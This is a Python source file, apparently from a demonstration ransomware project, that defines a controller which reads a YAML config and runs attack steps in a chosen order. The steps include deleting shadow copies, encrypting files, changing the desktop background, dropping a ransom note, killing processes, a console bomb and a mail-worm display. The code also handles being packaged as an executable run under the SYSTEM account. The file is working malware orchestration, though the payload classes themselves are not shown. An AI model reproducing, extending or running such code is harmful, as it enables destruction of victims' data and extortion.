import sys
from getpass import getuser
from yaml.loader import SafeLoader
from yaml import load as yamlload
from sys import exit
from os.path import abspath, dirname, join
from demos.fokusrnware.native.ransomware.Rmware import Rmware
from demos.fokusrnware.native.ransomware.Encrypter import Encrypter
from demos.fokusrnware.native.ransomware.Hacker import Hacker
import types

'''
    This class combines all the functionalities of the other classes
    in one class. The controller builds using the read YAML file
    to be able to set the objects of the other class specifically.
    Furthermore, the controller class can print all attributes
    of all created objects. In addition, the order of the attack
    is also read from the YAML file, whereby the controller can
    execute the functionalities or methods of the other classes
    according to a defined order.
'''


class Controller:
    def __init__(self, pathprefix="", user=getuser()) -> None:
        self.pathprefix = join(abspath(dirname(__file__)), "resource")
        # self.pathprefix = join(str(pathlib.Path(__file__).
        # parent.resolve()), "resource")
        self.user = user
        # self.checkEXE()
        self.configDic = self.loadYamlFile(pathprefix + "\\config.yml")
        self.rnsmware, self.hacker = self.buildObjects()
        self.rnsmware.user = self.user
        self.hacker.user = self.user
        self.methodDic = {
            "SE": self.hacker.playSound,
            "HB": self.hacker.hackerBox,
            "SR": self.hacker.showUserAdminRights,
            "KP": self.hacker.kProcessByName,
            "PA": self.hacker.consoleBomb,
            "DS": self.rnsmware.delShadowCopy,
            "EF": self.rnsmware.encFiles,
            "CB": self.rnsmware.changeBackground,
            #"EW": self.emailworm.runWorm,
            "EW": self.hacker.mailWormShow,
            "PR": self.rnsmware.placeRansom
        }
        self.mode, self.sequenceDic = self.getSequenceAndMode()
        self.checkSequence()
        self.configDic.clear() # it wont be used anymore and if it not cleared, the whole yaml data will be printed when mode has the value "show"
    

    '''
        Checks if the script is run in an exe file, if it runs in an exe, then this function adjusts the globalvariables, so it can find the resource files
    '''
    def checkEXE(self) -> None:
        if getattr(sys, 'frozen', False): # check if an exe is executed instead of a script
            self.pathprefix =  getattr(sys, '_MEIPASS', abspath(dirname(__file__))) + "\\" # sets path for embedded mediafiles
            self.user = sys.executable.split('\\')[2] # Important, when the programm was executed with another user. For example NT-Authority SYSTEM
    
    '''
        loads contents of a yaml file
        @return: dictionary with the contents of the yaml file
    '''
    def loadYamlFile(self, pathToYamlFile) -> dict:
          with open(self.pathprefix + pathToYamlFile, encoding="utf-8") as f:
            BuildData = yamlload(f, Loader=SafeLoader)
            return BuildData


    '''
        Checks whether all the commands read out are also present. If a KeyError occurs, the program is exited and an error message is returned
    '''
    def checkSequence(self) -> None:
        for key in self.sequenceDic:
            try:
                if ' -- ' in self.sequenceDic[key]: # check for parameters
                    info = self.sequenceDic[key].split(' -- ')[0]
                else:
                    info = self.sequenceDic[key]
                self.methodDic[info]
            except KeyError:
                exit("The Key " + self.sequenceDic[key] + " in " + key + " is not mapped with a method")

    '''
        Checks if a file can be opened
        @param fileName: the name of the file, which will be checked
        @return: true or false, based on if the file was open succesfully
    '''

    def checkFileCanBeOpened(self, fileName) -> bool:
        if fileName != None:
            try:
                open(str(fileName)).close()
                return True
            except FileNotFoundError:
                return False


    '''
        Checks if the given value from RWBuildData is valid
        @param value: value which will be checked
        @param possibleValues: a List of possible values, which will be used to check, if the variable value is valid
        @return: if the value was valid, True will be returned otherwise False will be returned
    '''
    
    def checkAvailable(self, value, possibleValues) -> bool:
        possibleValues = possibleValues.split(', ')
        if value != None and value in possibleValues:
            return True
        else:
            return False

    '''
        checks if value has the right size
        @param value: value which will be checked
        @param length: right size
        return: True if right size, False if wrong Size
    '''
    def checkLength(self, value, length) -> bool:
        if len(value) == length:
            return True
        else:
            return False
    
    '''
        checks if value has the right type
        @param value: value which will be checked
        @param length: right type
        return: True if right type, False if wrong type
    '''
    def checkType(self, value, valType) -> bool:
        if valType == "int":
            if type(value) == int:
                return True
            else:
                return False
        elif valType == "bool":
            if type(value) == bool:
                return True
            else:
                return False
        else:
            if type(value) == str:
                return True
            else:
                return False


    '''
        This function builds all necessary object with the buildobject method and subdirectories, based on the contents of config.yml
        param pathToYamlFIle: path to the file, which will be used to configure the objects.
        return: prepared Rmware and hacker object
    '''

    def buildObjects(self) -> any:
            encr = Encrypter()
            hacker = Hacker()
            rnsmware = Rmware()
            encr = self.buildObject(self.configDic['Encryption'], encr)
            hacker = self.buildObject(self.configDic['Hacker'], hacker)
            rnsmware = self.buildObject(self.configDic['Ransomware'], rnsmware)
            rnsmware.encr = encr
            return rnsmware, hacker

    '''
        Uses the helper methods to be able to set the value of an attribute as valid or invalid
        @param attr: attribute for a object
        @param objectDir: a map with setting from the yamlfile for a specific object
        @return: if valid it will return True, otherwise it will return False
    '''
    def useChecker(self, attr, objectDic) -> bool:
        checkerValue = objectDic[attr]["checker"]
        attrValue = objectDic[attr]["value"]
        if checkerValue == "available":
            return self.checkAvailable(attrValue, objectDic[attr]["parameter"])
        elif checkerValue == "type":
            return self.checkType(attrValue, objectDic[attr]["parameter"])
        elif checkerValue == "length":
            return self.checkLength(attrValue, objectDic[attr]["parameter"])
        elif checkerValue == "openable":
            return self.checkFileCanBeOpened(attrValue)
        elif checkerValue == "openableList": # handels a map of multiple path values
            for key in attrValue:
                if self.checkFileCanBeOpened(attrValue[key]) == False:
                    return False
            return True
        else:
            exit("The checker value for " + attr + " is not avaialable as a option")

    '''
        Checks the contents of the read YAML file and sets the defined options as attribute values of an object
        @param objectDir:  a map with setting from the yamlfile for a specific object
        @param obj: a class object
        @return: prepared object
    '''
    def buildObject(self, objectDic, obj) -> object:
        for a in dir(obj):
            if not a.startswith('__') and not callable(getattr(obj, a)): # filters everything besides attributes
                try:
                    if a in objectDic:
                        if objectDic[a]["checker"] != None:
                            if objectDic[a]["checker"] == "openable": 
                                objectDic[a]["value"] =  join(self.pathprefix, objectDic[a]["value"])
                            elif objectDic[a]["checker"] == "openableList":
                                for key in objectDic[a]["value"]:
                                    objectDic[a]["value"][key] =  join(self.pathprefix, objectDic[a]["value"][key])
                            if self.useChecker(a, objectDic):
                                setattr(obj, a, objectDic[a]["value"])
                            else:
                                print("check returned a false, default value for <" + a + "> will be used")
                        else: # if there is no checker defined for the attribute, then it can be set as a attribute value, without check
                            setattr(obj, a, objectDic[a]["value"])
                except KeyError:
                    exit("config file is malformed at <" + a + ">, please check keys")   
                except AttributeError:
                    exit("value in key " + a + " is malformed")         
        return obj
    
    '''
        Reads the mode and execution order from the YAML file
        @param configPath: Path to YAML file
        @return: mode and execution order 
    '''
    def getSequenceAndMode(self) -> any:
        return self.configDic["Run"]["mode"], self.configDic["Run"]["sequence"]


    '''
        Prints recursivly the values of class attributes. This method is used for debug purposes
        @param objectValue: object of a defined class 
    '''
    def printValuesOfObject(self, objectValue) -> None:
            print("\n")
            print("Values of "+ str(type(objectValue)) + " object")
            classObjectList = list()
            #for attr, value in objectValue.__dict__.items():
            for attr in dir(objectValue):
                if(attr == "emailworm"):
                    print("SSSHHHHHHHHHHHHHHHHHHHH")
                #if not attr.startswith('__') and not callable(getattr(objectValue, attr)): # filters everything besides attributes
                if not attr.startswith('__') and not  type(getattr(objectValue, attr)) == types.MethodType:
                    value = getattr(objectValue, attr)
                    print(" " * 3 + str(attr) + " = " + str(value))
                    #print("\n")
                    if hasattr(value, '__dict__'): # only user defined class and not instance of concrete built-in types have this attribute
                        classObjectList.append(value)
            for classObject in classObjectList:    
                self.printValuesOfObject(classObject)

    '''
        Executes the defined order of the methods
    '''
    def run(self) -> None:
        if self.mode == "execute":
            for key in self.sequenceDic:
                if ' -- ' in self.sequenceDic[key]:
                    info = self.sequenceDic[key].split(' -- ')
                    func = self.methodDic[info[0]]
                    func(info[1])
                else:
                    func = self.methodDic[self.sequenceDic[key]]
                    func()
        elif self.mode == "show":
            self.printValuesOfObject(self)
        else:
            print("check value in mode")

